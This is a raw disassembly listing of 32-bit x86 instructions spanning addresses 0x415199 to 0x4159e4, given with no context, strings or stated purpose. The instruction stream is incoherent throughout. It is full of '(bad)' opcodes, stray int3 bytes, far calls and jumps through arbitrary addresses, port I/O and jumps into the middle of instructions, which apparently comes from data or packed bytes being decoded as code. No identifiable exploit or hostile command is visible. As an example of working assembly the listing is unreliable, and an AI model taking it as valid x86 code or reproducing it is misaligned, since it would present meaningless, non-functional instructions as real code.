  415199:	dec    DWORD PTR [edx-0x1]
  41519c:	mov    esi,0x6ff6089
  4151a1:	call   FWORD PTR [edi]
  4151a3:	mov    DWORD PTR [esi],esp
  4151a5:	jmp    FWORD PTR [edx-0x1]
  4151a8:	rol    BYTE PTR [eax],0x8
  4151ab:	add    BYTE PTR [edi-0x1],ch
  4151ae:	nop
  4151af:	(bad)  
  4151b0:	out    dx,eax
  4151b1:	inc    DWORD PTR [edx]
  4151b3:	int3   
  4151b4:	pop    ds
  4151b5:	cmp    DWORD PTR [edi-0x34],0xffffffa7
  4151b9:	call   FWORD PTR [ecx+ecx*4+0xa289de]
  4151c0:	ins    BYTE PTR es:[edi],dx
  4151c1:	add    BYTE PTR [esi+0x0],ch
  4151c4:	mov    ebp,0xdf00d1ff
  4151c9:	jmp    DWORD PTR [ebx+eax*4]
  4151cc:	sar    edi,1
  4151ce:	inc    esp
  4151cf:	add    BYTE PTR [ebx],dl
  4151d1:	add    BYTE PTR [esi-0x1],al
  4151d4:	mov    esp,0xfc8909cc
  4151d9:	mov    DWORD PTR [esi],edx
  4151db:	jmp    FWORD PTR [edx+0x4083fe00]
  4151e1:	add    BYTE PTR [edx],dl
  4151e3:	(bad)  
  4151e4:	call   0xb640fee8
  4151e9:	inc    ebx
  4151eb:	and    DWORD PTR [eax+0x6cff2589],0x0
  4151f2:	repnz add DWORD PTR [edi+0x4a00e183],0x0
  4151fa:	rol    BYTE PTR [ebx+0x1800d0],1
  415200:	add    DWORD PTR [eax],0xcc30008c
  415206:	xchg   edx,eax
  415207:	mov    DWORD PTR [edx+0x48ffbbff],esi
  41520d:	mov    edi,esp
  41520f:	add    BYTE PTR [ecx-0x1d00407d],bh
  415215:	mov    DWORD PTR [ebp-0x1],ecx
  415218:	jl     0x41521a
  41521a:	and    eax,DWORD PTR [eax]
  41521c:	mov    eax,ds:0xaa00b789
  415221:	or     ebp,0xffffffff
  415224:	dec    edx
  415225:	call   DWORD PTR [ebx]
  415227:	add    bh,dl
  415229:	add    ch,cl
  41522b:	push   DWORD PTR ds:0xc9ff0e00
  415231:	add    al,bl
  415233:	cmp    DWORD PTR [edx-0x1],0xffffffc3
  415237:	mov    DWORD PTR [edi+edi*8-0xb4ffb3],ebp
  41523e:	xlat   BYTE PTR ds:[ebx]
  41523f:	(bad)  
  415240:	cmp    eax,0x30832d00
  415245:	add    BYTE PTR [edi+edi*8+0xf00076],cl
  41524c:	mov    eax,ds:0xbcff75ff
  415251:	jmp    DWORD PTR [esi+0x0]
  415254:	add    DWORD PTR [eax],eax
  415256:	inc    DWORD PTR [ebx-0x1dff9a]
  41525c:	pop    DWORD PTR [ebx-0x33c600c6]
  415262:	pop    ds
  415263:	mov    DWORD PTR [ebx+0x61ff1f00],ebp
  415269:	inc    edi
  41526b:	add    BYTE PTR [ecx-0x7d],dl
  41526e:	dec    ecx
  41526f:	int3   
  415270:	retf   0xccf1
  415273:	add    BYTE PTR [eax],cl
  415275:	int3   
  415276:	call   FWORD PTR [eax+ebx*1+0x3f]
  41527a:	int3   
  41527b:	jmp    DWORD PTR [eax-0x1]
  41527e:	add    BYTE PTR [ebx+0xff5b12],bh
  415284:	or     edi,edi
  415286:	add    BYTE PTR [eax-0x4d],cl
  415289:	inc    ebx
  41528a:	add    bh,bh
  41528c:	push   ss
  41528d:	add    bh,bh
  41528f:	imul   ah
  415291:	loop   0x41521c
  415293:	call   FWORD PTR [ecx+0x0]
  415296:	push   DWORD PTR [ebp+0x63]
  415299:	pop    edi
  41529a:	add    bh,bh
  41529c:	(bad)  
  41529e:	int3   
  41529f:	bound  esp,QWORD PTR [eax-0x70033fb]
  4152a5:	dec    DWORD PTR [ecx+0x22dcb3]
  4152ab:	add    BYTE PTR [eax],cl
  4152ad:	cmp    edi,0xffffffd7
  4152b0:	xchg   ecx,eax
  4152b1:	icebp  
  4152b2:	inc    DWORD PTR [eax]
  4152b4:	repnz (bad) 
  4152b6:	(bad)  
  4152b7:	jg     0x4152b8
  4152b9:	mov    cl,0xff
  4152bb:	add    BYTE PTR [eax+0x7c8200cc],dh
  4152c1:	and    bh,bh
  4152c3:	(bad)  
  4152c4:	jg     0x415249
  4152c6:	(bad)  
  4152c7:	jle    0x4152d4
  4152c9:	inc    ebp
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	pop    ebx
  4152cd:	add    BYTE PTR [ebx-0xc825cd],al
  4152d3:	or     DWORD PTR [eax-0x72370100],0xffffffda
  4152da:	(bad)  
  4152db:	push   DWORD PTR [esi-0x3d57c01]
  4152e1:	imul   eax,DWORD PTR [eax],0xff01ff
  4152e7:	sub    BYTE PTR [esi-0x10ff3348],ch
  4152ed:	dec    esp
  4152ef:	int    0x65
  4152f1:	push   ecx
  4152f2:	add    bh,bh
  4152f4:	loop   0x4152f5
  4152f6:	add    BYTE PTR [ebp+0xcc140f],ch
  4152fc:	cwde   
  4152fd:	inc    DWORD PTR [eax]
  4152ff:	jmp    0xff13:0xb4e8
  415306:	dec    DWORD PTR [edi+0x40]
  415309:	adc    al,0x0
  41530b:	inc    esp
  41530d:	int3   
  41530e:	push   DWORD PTR [esi]
  415310:	dec    esi
  415311:	sub    BYTE PTR [eax],al
  415313:	add    bh,al
  415315:	(bad)  
  415316:	dec    DWORD PTR [ecx-0x33002c90]
  41531c:	or     eax,DWORD PTR [ebx-0x668c3b01]
  415322:	add    BYTE PTR [ecx-0x600ffc5],cl
  415328:	dec    edi
  415329:	sbb    bh,bh
  41532b:	call   FWORD PTR [ecx]
  41532d:	(bad)  
  41532e:	inc    DWORD PTR [eax]
  415330:	es mov DWORD PTR ds:[ecx+0x6aff005c],ecx
  415338:	push   edi
  415339:	cmp    eax,0x89f2ff00
  41533e:	call   esi
  415340:	mov    ah,0x61
  415342:	add    BYTE PTR [ecx-0x74337c7f],cl
  415348:	pop    esp
  415349:	lds    ecx,FWORD PTR [ecx+0xffddff]
  41534f:	jno    0x415303
  415351:	sub    bh,bh
  415353:	sbb    DWORD PTR [ebx-0x4aacff34],0xffffffc8
  41535a:	inc    DWORD PTR [ebx-0x3d7cffee]
  415360:	inc    edx
  415361:	mov    ds:0xd6ffff,eax
  415366:	jmp    DWORD PTR ds:0x83ffc804
  41536c:	mov    ebx,0x42fe00ff
  415371:	pop    es
  415372:	add    bh,bh
  415374:	push   0xf3f60000
  415379:	push   esp
  41537a:	cmp    edi,0xffffffa1
  41537d:	inc    DWORD PTR [eax]
  41537f:	icebp  
  415380:	and    DWORD PTR [edi-0x77],ebp
  415383:	call   DWORD PTR [eax+eax*1]
  415386:	push   edx
  415388:	ja     0x415357
  41538a:	int3   
  41538b:	cmp    DWORD PTR [ecx-0x7d],0xffffffcc
  41538f:	loope  0x415368
  415391:	cld    
  415392:	(bad)  
  415393:	call   FWORD PTR [eax-0x1]
  415396:	add    BYTE PTR [edx],ah
  415398:	ins    DWORD PTR es:[edi],dx
  415399:	iret   
  41539a:	mov    DWORD PTR [eax],eax
  41539c:	and    eax,0x3f2200ff
  4153a1:	retf   
  4153a2:	add    bh,bh
  4153a4:	push   ebp
  4153a5:	(bad)  
  4153a6:	dec    DWORD PTR [esi+0x49]
  4153a9:	ss int3 
  4153ab:	sbb    edi,0x0
  4153ae:	add    BYTE PTR [edx+0x53],ah
  4153b1:	outs   dx,BYTE PTR ds:[esi]
  4153b2:	int3   
  4153b3:	add    BYTE PTR [ecx],al
  4153b5:	add    ah,cl
  4153b7:	and    DWORD PTR [esi],esp
  4153b9:	dec    ebx
  4153ba:	(bad)  
  4153bb:	inc    eax
  4153bd:	add    BYTE PTR [eax],al
  4153bf:	dec    edx
  4153c0:	mov    eax,0xeccc83e6
  4153c5:	(bad)  
  4153c6:	jmp    ebp
  4153c8:	out    0x60,al
  4153ca:	inc    DWORD PTR [ebx+0x1f8300dd]
  4153d0:	dec    ecx
  4153d1:	ror    ah,cl
  4153d3:	call   FWORD PTR [ebx+0x41b88300]
  4153d9:	idiv   bh
  4153db:	add    ah,ch
  4153dd:	cmp    edi,0xffffff88
  4153e0:	in     eax,dx
  4153e1:	hlt    
  4153e2:	inc    DWORD PTR [eax]
  4153e4:	das    
  4153e5:	add    BYTE PTR [ebx-0x9b1733],al
  4153eb:	call   DWORD PTR [edi]
  4153ed:	int3   
  4153ee:	add    bh,bh
  4153f0:	cwde   
  4153f1:	out    dx,al
  4153f2:	(bad)  
  4153f3:	call   FWORD PTR [eax-0x7d]
  4153f6:	mov    DWORD PTR [ebp-0x2c],esi
  4153f9:	fiadd  DWORD PTR [eax]
  4153fb:	add    BYTE PTR [ecx+0x0],dh
  4153fe:	jmp    esi
  415400:	push   dx
  415402:	inc    DWORD PTR [eax]
  415404:	add    DWORD PTR [eax],0xffffffff
  415407:	loopne 0x41543d
  415409:	cmc    
  41540a:	add    DWORD PTR [eax],0x52
  41540d:	cmp    edi,0xffffffe6
  415410:	push   eax
  415411:	cwde   
  415412:	(bad)  
  415413:	dec    DWORD PTR [ebp+0x0]
  415416:	int3   
  415417:	fs out 0xbc,eax
  41541a:	inc    DWORD PTR [eax]
  41541c:	jns    0x4153a7
  41541e:	call   FWORD PTR [eax-0x58]
  415421:	fadd   DWORD PTR [eax]
  415423:	add    dl,cl
  415425:	inc    DWORD PTR [eax]
  415427:	fst    DWORD PTR ds:0xb689ff04
  41542d:	add    BYTE PTR [ebx-0x184113],al
  415433:	sbb    DWORD PTR [ecx],0xffffffff
  415436:	cmp    DWORD PTR [esi+edx*4-0x7fffffd8],0xffffffff
  41543e:	(bad)  
  41543f:	frstor [eax]
  415441:	push   ecx
  415442:	add    BYTE PTR [eax],al
  415444:	lock (bad) 
  415446:	(bad)  
  415447:	jmp    0xffc4a4dc
  41544c:	into   
  41544d:	mov    DWORD PTR [eax],eax
  41544f:	xor    al,0xfb
  415451:	daa    
  415452:	cmp    edi,0x34
  415455:	add    DWORD PTR [ebx-0x8045bc],0x0
  41545c:	loop   0x41545d
  41545e:	adc    DWORD PTR [ecx-0xe22b],0xffffffd0
  415465:	add    BYTE PTR [ebx-0xac43da],al
  41546b:	dec    DWORD PTR [esi-0x1ffa0001]
  415471:	test   al,0x0
  415473:	dec    DWORD PTR [esi+0x0]
  415476:	dec    edx
  415478:	mov    esi,edi
  41547a:	(bad)  
  41547b:	call   DWORD PTR [ebx]
  41547d:	inc    DWORD PTR [ebx+0xdc2a3b]
  415483:	(bad)  
  415484:	jnp    0x415485
  415486:	and    DWORD PTR [ecx-0x2f],0x23
  41548a:	add    DWORD PTR [eax],0xffffffcb
  41548d:	add    DWORD PTR [eax],0x13
  415490:	push   0xe7ff00f5
  415495:	int3   
  415496:	add    BYTE PTR [eax+0x46],ah
  415499:	jmp    0xcc795521
  41549e:	mov    edx,esi
  4154a0:	mov    cl,0xcc
  4154a2:	add    BYTE PTR [ebx-0x6833fffd],al
  4154a8:	pop    ebx
  4154a9:	loopne 0x415434
  4154ab:	add    BYTE PTR [edi],bl
  4154ad:	add    ah,cl
  4154af:	push   ss
  4154b0:	pop    eax
  4154b1:	sbb    DWORD PTR [ebx-0x7cff8501],eax
  4154b7:	inc    ebp
  4154b8:	add    BYTE PTR [ecx+0x0],al
  4154bb:	push   DWORD PTR [eax+0x3605ff00]
  4154c1:	xchg   edi,eax
  4154c2:	mov    DWORD PTR [ecx-0x3a0000d6],ecx
  4154c8:	out    0x92,eax
  4154ca:	(bad)  
  4154cb:	dec    DWORD PTR [ebp+0x0]
  4154ce:	add    BYTE PTR [ebp-0x33e489],ah
  4154d4:	loopne 0x4154d5
  4154d6:	inc    DWORD PTR [esi-0xf]
  4154d9:	cmp    ecx,DWORD PTR [ecx+0x1aff]
  4154df:	cmp    ch,BYTE PTR [edx+0x3800831d]
  4154e5:	dec    esp
  4154e7:	jmp    0xe4fdb
  4154ec:	jo     0x4154ed
  4154ee:	push   DWORD PTR [esi+0x59]
  4154f1:	stos   DWORD PTR es:[edi],eax
  4154f2:	(bad)  
  4154f3:	jmp    DWORD PTR [edx+0x0]
  4154f6:	add    BYTE PTR [eax+ebx*2+0xe],bh
  4154fa:	mov    edi,edi
  4154fc:	xchg   edi,edi
  4154fe:	dec    DWORD PTR ds:0xffff37a1
  415504:	adc    BYTE PTR [eax],al
  415506:	and    DWORD PTR [esi-0x3376810e],0xffffffcc
  41550d:	inc    DWORD PTR [eax]
  41550f:	push   ax
  415511:	or     al,0x0
  415513:	add    BYTE PTR [ebp+0x47f400ff],dh
  415519:	add    BYTE PTR cs:[ebx+0x22ffff42],al
  415520:	fwait
  415521:	xchg   edi,eax
  415522:	(bad)  
  415523:	(bad)  
  415524:	jmp    0x55885528
  415529:	lahf   
  41552a:	dec    esp
  41552c:	add    BYTE PTR [eax],0x0
  41552f:	fs xchg esp,eax
  415531:	sar    bh,1
  415533:	call   FWORD PTR [ecx]
  415535:	dec    esp
  415537:	jmp    0x41552a
  415539:	or     eax,0xffcfff00
  41553e:	(bad)  
  41553f:	cmp    ecx,DWORD PTR [esi]
  415541:	sub    bh,bh
  415543:	xor    DWORD PTR [ebx],0xffffffff
  415546:	(bad)  
  415547:	mov    ebp,0xcc452b
  41554c:	sub    al,0xcc
  41554e:	call   FWORD PTR [eax+0x18]
  415551:	ja     0x415552
  415553:	jmp    DWORD PTR [ecx-0x1423ff01]
  415559:	or     al,0xff
  41555b:	add    BYTE PTR [eax],dl
  41555d:	add    BYTE PTR [eax],al
  41555f:	mov    ds:0xcccc1b5c,al
  415564:	ror    ah,0x83
  415567:	(bad)  
  415568:	xchg   esp,eax
  415569:	mov    edi,edi
  41556b:	dec    DWORD PTR [eax+eax*1]
  41556e:	sbb    DWORD PTR [edx+0x5d],0x16
  415572:	add    bh,bh
  415574:	xlat   BYTE PTR ds:[ebx]
  415575:	(bad)  
  415576:	(bad)  
  415577:	jg     0x4155e0
  415579:	push   ds
  41557a:	add    BYTE PTR [ecx-0x63000060],cl
  415580:	adc    eax,0xd5ff831b
  415585:	add    BYTE PTR [eax],al
  415587:	hlt    
  415588:	or     ch,bh
  41558a:	int3   
  41558b:	(bad)  
  41558c:	fdivp  st(7),st
  41558e:	call   DWORD PTR [esi-0x67]
  415591:	push   ecx
  415592:	add    bh,bh
  415594:	std    
  415595:	add    bh,bh
  415597:	push   ds
  415598:	fadd   st(1),st
  41559a:	add    bh,bh
  41559c:	test   al,0xff
  41559e:	(bad)  
  41559f:	fcomp  QWORD PTR [edx]
  4155a1:	sbb    al,0xff
  4155a3:	add    bh,dl
  4155a5:	add    BYTE PTR [eax],al
  4155a7:	pusha  
  4155a8:	lods   eax,DWORD PTR ds:[esi]
  4155a9:	test   bh,bh
  4155ab:	jmp    FWORD PTR ds:0x60d5ff00
  4155b1:	(bad)  
  4155b2:	(bad)  
  4155b3:	call   FWORD PTR [edi]
  4155b5:	inc    DWORD PTR [eax]
  4155b7:	dec    esi
  4155b8:	adc    al,0x92
  4155ba:	(bad)  
  4155bb:	dec    DWORD PTR [edi+edi*8-0x77]
  4155bf:	int    0x58
  4155c1:	(bad)  
  4155c3:	int3   
  4155c4:	push   esi
  4155c5:	inc    DWORD PTR [eax]
  4155c7:	cdq    
  4155c8:	push   cs
  4155c9:	fs int3 
  4155cb:	inc    DWORD PTR [edx-0x1]
  4155ce:	add    BYTE PTR [edx-0x76ff77aa],al
  4155d4:	pusha  
  4155d5:	add    bh,bh
  4155d7:	es xchg ecx,eax
  4155d9:	or     ah,0xff
  4155dc:	fdivr  st,st(7)
  4155de:	int3   
  4155df:	cs inc ebx
  4155e1:	mov    BYTE PTR [eax],al
  4155e3:	inc    DWORD PTR [ecx-0x1]
  4155e6:	jmp    FWORD PTR [edx+0x68]
  4155e9:	ud0    edi,edi
  4155ec:	ret    0x0
  4155ef:	add    BYTE PTR [edx+0x4d89ff68],bl
  4155f5:	int3   
  4155f6:	jmp    DWORD PTR [ecx-0x7c5abd]
  4155fc:	xor    edi,edi
  4155fe:	mov    DWORD PTR [edi-0xff1f1f],eax
  415604:	dec    ebx
  415605:	dec    DWORD PTR [ecx+0xe65264]
  41560b:	inc    DWORD PTR [edi+edi*8-0x7d]
  41560f:	repnz mov cl,0x34
  415612:	(bad)  
  415613:	jmp    FWORD PTR [ecx]
  415615:	int3   
  415616:	inc    ebp
  415618:	adc    ebx,DWORD PTR [esp+ecx*8+0xff74ff]
  41561f:	and    ecx,edx
  415621:	mov    ah,0xff
  415623:	dec    DWORD PTR [edx-0x6a60ff7d]
  415629:	loope  0x4155b4
  41562b:	add    al,cl
  41562d:	inc    DWORD PTR [eax]
  41562f:	push   edi
  415630:	pop    ecx
  415631:	mov    dl,0x0
  415633:	inc    DWORD PTR [edi]
  415635:	add    bh,bh
  415637:	idiv   BYTE PTR [ebx-0x6b]
  41563a:	add    BYTE PTR [eax],al
  41563c:	out    dx,al
  41563d:	or     DWORD PTR [ecx-0x9b0aa0],0xffffff83
  415644:	out    0xff,eax
  415646:	inc    edi
  415648:	inc    esi
  415649:	mov    dh,0xff
  41564b:	add    dl,bl
  41564d:	add    BYTE PTR [ecx-0x4414ed],cl
  415653:	mov    DWORD PTR [ecx+0x390000ff],edi
  415659:	and    al,BYTE PTR [eax]
  41565b:	(bad)  
  41565c:	mov    edx,0x912a00ff
  415661:	jno    0x4155e6
  415663:	int3   
  415664:	sar    bh,0x89
  415667:	and    dh,BYTE PTR fs:[edi]
  41566a:	(bad)  
  41566b:	(bad)  
  41566c:	js     0x41563a
  41566e:	mov    DWORD PTR [edi],ebx
  415670:	loope  0x415628
  415672:	inc    DWORD PTR [eax]
  415674:	mov    bh,bh
  415676:	(bad)  
  415677:	in     eax,dx
  415678:	fcomi  st,st(2)
  41567a:	add    DWORD PTR [eax],0xffffffa3
  41567d:	(bad)  
  41567e:	(bad)  
  41567f:	aas    
  415680:	mov    eax,0xe20000e7
  415685:	(bad)  
  415686:	call   DWORD PTR ds:0x8900479f
  41568c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41568d:	dec    DWORD PTR [ecx+0x522ad3]
  415693:	add    ah,bl
  415695:	add    DWORD PTR [ebx-0x2b694],0xffffffff
  41569c:	mov    edx,0x141fff00
  4156a1:	ud0    eax,DWORD PTR [ebx-0xd7c7ca0]
  4156a8:	sbb    eax,0xec8300ab
  4156ad:	mov    DWORD PTR [ebx-0x7c3dcc2f],eax
  4156b3:	jmp    FWORD PTR [ecx+0x0]
  4156b6:	cmp    eax,0xfffffffa
  4156b9:	ret    0xff
  4156bc:	into   
  4156bd:	dec    DWORD PTR [ecx-0x9ac606]
  4156c3:	add    bl,dh
  4156c5:	dec    DWORD PTR [ecx-0x7c345318]
  4156cb:	(bad)  
  4156cc:	(bad)  
  4156ce:	inc    edx
  4156d0:	pop    esi
  4156d1:	sub    al,0xff
  4156d3:	sub    DWORD PTR [edi-0x34],0xffffffff
  4156d7:	add    bl,BYTE PTR [edx]
  4156d9:	pop    ds
  4156da:	int3   
  4156db:	int3   
  4156dc:	enter  0xcc00,0x82
  4156e0:	or     eax,0x27cc8374
  4156e5:	int3   
  4156e6:	int3   
  4156e7:	mov    ds:0xf2e2,al
  4156ec:	(bad)  
  4156ee:	add    bh,ch
  4156f0:	pop    eax
  4156f1:	mov    dh,0x0
  4156f3:	add    BYTE PTR [edx],dh
  4156f5:	add    bh,bh
  4156f7:	xor    ecx,DWORD PTR [ecx]
  4156f9:	push   edi
  4156fa:	cmp    edi,0x7c
  4156fd:	(bad)  
  4156fe:	jmp    FWORD PTR [ebp-0xff5773]
  415704:	lea    eax,[eax]
  415706:	add    BYTE PTR [eax+0xff5cd1],dl
  41570c:	push   ss
  41570d:	int3   
  41570e:	mov    DWORD PTR [ecx+0xff18f9],eax
  415714:	ud0    ecx,esp
  415717:	aad    0x9f
  415719:	mov    ah,0xff
  41571b:	mov    edx,ebx
  41571d:	add    bh,bh
  41571f:	push   esp
  415720:	dec    edx
  415721:	iret   
  415722:	int3   
  415723:	push   ebp
  415725:	add    DWORD PTR [ebx+0x404eee],0x0
  41572c:	dec    eax
  41572d:	inc    DWORD PTR [ebx+0xcb3ac3]
  415733:	add    bh,ah
  415735:	inc    DWORD PTR [eax]
  415737:	jae    0x415775
  415739:	add    al,0x0
  41573b:	sbb    ebx,0xffffff83
  41573e:	add    BYTE PTR [eax],ah
  415740:	jp     0x4157a6
  415742:	cmp    edi,0xffffffdd
  415745:	mov    DWORD PTR [eax],eax
  415747:	sbb    bl,BYTE PTR [ebx+0x5accff22]
  41574d:	int3   
  41574e:	cmp    DWORD PTR [edi+0x9074],0x5e
  415755:	inc    DWORD PTR [eax]
  415757:	adc    DWORD PTR [ebx+0x6083ff94],ebx
  41575d:	add    DWORD PTR [ebx-0xd5190e],0x0
  415764:	mov    eax,ds:0x6e03ff00
  415769:	pop    esi
  41576a:	(bad)  
  41576b:	push   DWORD PTR [esi+0x0]
  41576e:	(bad)  
  41576f:	sti    
  415770:	xchg   esi,eax
  415771:	loope  0x415773
  415773:	add    BYTE PTR [eax+eax*1],ah
  415776:	add    BYTE PTR [esi+0xebcd],ah
  41577c:	cmp    bh,bh
  41577e:	add    BYTE PTR [edi],cl
  415780:	int    0x42
  415782:	inc    DWORD PTR [eax]
  415784:	test   DWORD PTR [eax],0xe1ea7ff
  41578a:	dec    DWORD PTR [ecx+0x10000a2]
  415790:	add    BYTE PTR [eax+0x6d00ff],0x83
  415797:	out    dx,eax
  415798:	mov    edi,cs
  41579a:	add    BYTE PTR [ebx+0x4affffa0],al
  4157a0:	mov    ebx,0x90fffff5
  4157a5:	add    DWORD PTR [ebx-0x7c287f38],0xffffffff
  4157ac:	mov    edi,edi
  4157ae:	dec    esi
  4157b0:	push   eax
  4157b1:	inc    edx
  4157b2:	add    BYTE PTR [eax],al
  4157b4:	ds add bh,bh
  4157b7:	push   cs
  4157b8:	cmp    al,0xc3
  4157ba:	(bad)  
  4157bb:	call   DWORD PTR [ecx-0x1c610000]
  4157c1:	nop
  4157c2:	add    bh,bh
  4157c4:	xor    BYTE PTR [eax],al
  4157c6:	add    BYTE PTR [edi],dl
  4157c8:	pop    ds
  4157c9:	jl     0x4157ca
  4157cb:	call   FWORD PTR [ebx]
  4157cd:	(bad)  
  4157ce:	jmp    eax
  4157d0:	mov    esp,0x2e89ff45
  4157d5:	(bad)  
  4157d6:	inc    DWORD PTR [ebp+ecx*1+0x7a]
  4157da:	add    BYTE PTR [eax],al
  4157dc:	dec    eax
  4157dd:	inc    DWORD PTR [eax]
  4157df:	dec    edx
  4157e0:	retf   0xcc97
  4157e3:	add    BYTE PTR [ecx+0x1b01ffff],ah
  4157e9:	call   0xa357ed
  4157ee:	inc    DWORD PTR [ebp-0x3f]
  4157f1:	push   ebp
  4157f2:	cmp    edi,0xffffff9d
  4157f5:	add    bh,bh
  4157f7:	mov    ebx,0xff009fb3
  4157fc:	mov    dh,0xff
  4157fe:	add    BYTE PTR [esi+0x79],ah
  415801:	in     al,0x0
  415803:	xor    DWORD PTR [ecx],0xffffffff
  415806:	jmp    FWORD PTR [edx-0x76b808]
  41580c:	sti    
  41580d:	inc    DWORD PTR [eax]
  41580f:	and    eax,0xffd158
  415814:	inc    ebp
  415815:	add    BYTE PTR [eax],al
  415817:	loope  0x415801
  415819:	ss add bh,bh
  41581c:	jg     0x4157ea
  41581e:	xor    DWORD PTR [ebx],0xfffffff2
  415821:	jmp    0x415822
  415823:	(bad)  
  415824:	js     0x415825
  415826:	add    BYTE PTR [edi],ah
  415828:	loopne 0x415815
  41582a:	add    BYTE PTR [eax],al
  41582c:	push   ebx
  41582d:	(bad)  
  41582e:	call   ebx
  415830:	int    0xb7
  415832:	add    bh,bh
  415834:	mov    eax,DWORD PTR [ebx+0x544d3000]
  41583a:	mov    edi,edi
  41583c:	cmp    cl,BYTE PTR [ecx+0x44217900]
  415842:	mov    DWORD PTR [eax],eax
  415844:	push   esp
  415845:	int3   
  415846:	sbb    esi,0xffffffe9
  415849:	out    0x0,al
  41584b:	sbb    DWORD PTR [edx],0xffffffff
  41584e:	sub    DWORD PTR [ecx-0x7c0002cd],0x78
  415855:	(bad)  
  415856:	(bad)  
  415857:	mov    edx,0xffffa152
  41585c:	mov    bh,bh
  41585e:	add    BYTE PTR [esi-0x57],dh
  415861:	cmp    edi,0x3789
  415867:	mov    dh,0xf8
  415869:	ins    BYTE PTR es:[edi],dx
  41586a:	add    BYTE PTR [eax],al
  41586c:	and    eax,0xf33700ff
  415871:	ins    BYTE PTR es:[edi],dx
  415872:	inc    DWORD PTR [eax]
  415874:	ret    0xffff
  415877:	lock add edi,DWORD PTR [ecx-0xe07601]
  41587e:	add    dh,ah
  415880:	stos   DWORD PTR es:[edi],eax
  415881:	mov    bl,0xff
  415883:	mov    DWORD PTR [esi+0x0],esp
  415886:	add    dl,al
  415888:	les    edx,FWORD PTR [edx+0x0]
  41588b:	jmp    FWORD PTR [ebx+0x0]
  41588e:	inc    DWORD PTR [ebp-0x1a]
  415891:	cld    
  415892:	(bad)  
  415893:	push   DWORD PTR [ebx-0x1]
  415896:	(bad)  
  415897:	inc    BYTE PTR [ecx+0x32ffffd8]
  41589d:	(bad)  
  41589e:	call   DWORD PTR [eax+0xe940]
  4158a4:	mov    ds:0xd49affff,eax
  4158a9:	mov    esp,0x40083
  4158ae:	(bad)  
  4158af:	ds mov ah,0x79
  4158b2:	int3   
  4158b3:	add    BYTE PTR [ecx+ecx*4+0x2fdec2ff],dh
  4158ba:	add    BYTE PTR [eax],al
  4158bc:	stos   BYTE PTR es:[edi],al
  4158bd:	(bad)  
  4158be:	dec    DWORD PTR [ebx-0x20a7]
  4158c4:	add    BYTE PTR [eax],al
  4158c6:	add    DWORD PTR [esi+0x32],0x30
  4158ca:	dec    DWORD PTR [ecx+0x5bcccc9a]
  4158d0:	iret   
  4158d1:	inc    DWORD PTR [eax]
  4158d3:	add    BYTE PTR [ecx+ecx*4+0x595a9eff],dl
  4158da:	inc    DWORD PTR [eax]
  4158dc:	iret   
  4158dd:	add    ah,cl
  4158df:	jle    0x415876
  4158e1:	or     al,0xff
  4158e3:	or     DWORD PTR [ebx-0x1],0x0
  4158e7:	stos   DWORD PTR es:[edi],eax
  4158e8:	ret    0xff09
  4158eb:	mov    DWORD PTR [esi],esi
  4158ed:	add    BYTE PTR [eax],al
  4158ef:	outs   dx,BYTE PTR ds:[esi]
  4158f0:	xchg   esi,eax
  4158f1:	pop    eax
  4158f2:	inc    DWORD PTR [eax]
  4158f4:	sub    edi,edi
  4158f6:	call   FWORD PTR [edx]
  4158f8:	fwait
  4158f9:	mov    ?,edi
  4158fb:	jmp    FWORD PTR [eax+eax*1+0x55f722ff]
  415902:	(bad)  
  415903:	dec    DWORD PTR [edi+edi*8]
  415906:	(bad)  
  415907:	jmp    0xff52:0xffffe06a
  41590e:	jmp    DWORD PTR [ebx-0x7c33d593]
  415914:	in     al,0x89
  415916:	jmp    FWORD PTR [eax]
  415918:	outs   dx,BYTE PTR ds:[esi]
  415919:	enter  0x89,0xb3
  41591d:	add    BYTE PTR [ebx-0xcc24e6],al
  415923:	jmp    DWORD PTR [edi]
  415925:	add    BYTE PTR [ebx+0x69ab8a],al
  41592b:	add    BYTE PTR [esi+0x7ec4ff83],bh
  415931:	cmp    bh,0xff
  415934:	(bad)  
  415935:	(bad)  
  415936:	jmp    FWORD PTR [esi]
  415938:	fist   DWORD PTR ds:0x83e4ffff
  41593e:	dec    DWORD PTR [esi-0x3300e430]
  415944:	add    bh,bh
  415946:	add    BYTE PTR [edi-0x7cffbe19],dl
  41594c:	mov    dh,0xff
  41594e:	jmp    FWORD PTR [edi+0x991f]
  415954:	pop    esp
  415955:	inc    DWORD PTR [eax]
  415957:	mov    ch,0x92
  415959:	cli    
  41595a:	add    ah,cl
  41595c:	popf   
  41595d:	inc    DWORD PTR [eax]
  41595f:	retf   0xf532
  415962:	cmp    edi,0xffffffdf
  415965:	add    bh,bh
  415967:	test   al,0x3f
  415969:	mov    al,0xcc
  41596b:	inc    DWORD PTR [eax]
  41596d:	dec    DWORD PTR [ecx-0xe1c08c]
  415973:	call   DWORD PTR [eax]
  415975:	int3   
  415976:	mov    DWORD PTR [edx+edi*1+0x3900ccea],eax
  41597d:	(bad)  
  41597e:	(bad)  
  41597f:	fmul   st(2),st
  415981:	push   cs
  415982:	inc    DWORD PTR [eax]
  415984:	push   esi
  415985:	inc    DWORD PTR [ebx+0xdfc12a]
  41598b:	add    BYTE PTR [ebp+0x538bff89],cl
  415991:	mov    ecx,0x89aeff83
  415996:	call   DWORD PTR [edx]
  415998:	sahf   
  415999:	into   
  41599a:	add    BYTE PTR [eax],al
  41599c:	mov    bh,0x83
  41599e:	int3   
  41599f:	popf   
  4159a0:	enter  0x27,0x0
  4159a4:	cmp    eax,DWORD PTR [eax]
  4159a6:	add    DWORD PTR [ebp+edi*8-0x6a767647],0xffffffff
  4159ae:	and    DWORD PTR [eax],0xffffffa9
  4159b1:	sti    
  4159b2:	add    bh,bh
  4159b4:	add    BYTE PTR [eax],0xff
  4159b7:	dec    eax
  4159b8:	xlat   BYTE PTR ds:[ebx]
  4159b9:	scas   eax,DWORD PTR es:[edi]
  4159ba:	add    bh,bh
  4159bc:	xchg   ebp,eax
  4159bd:	or     esp,0x52
  4159c0:	add    al,0x4d
  4159c2:	add    BYTE PTR [ebx-0x3330013],al
  4159c8:	and    bh,BYTE PTR [ebx]
  4159ca:	inc    DWORD PTR [ebx+0x40ff89b0]
  4159d0:	xchg   ecx,eax
  4159d1:	pop    eax
  4159d2:	or     DWORD PTR [ecx+0x2effff23],0x40
  4159d9:	ja     0x4159a7
  4159db:	dec    eax
  4159dd:	add    BYTE PTR [eax],al
  4159df:	aam    0xc7
  4159e1:	ds add bh,bh
  4159e4:	or     ecx,DWORD PTR [ecx+0x1d17c700]
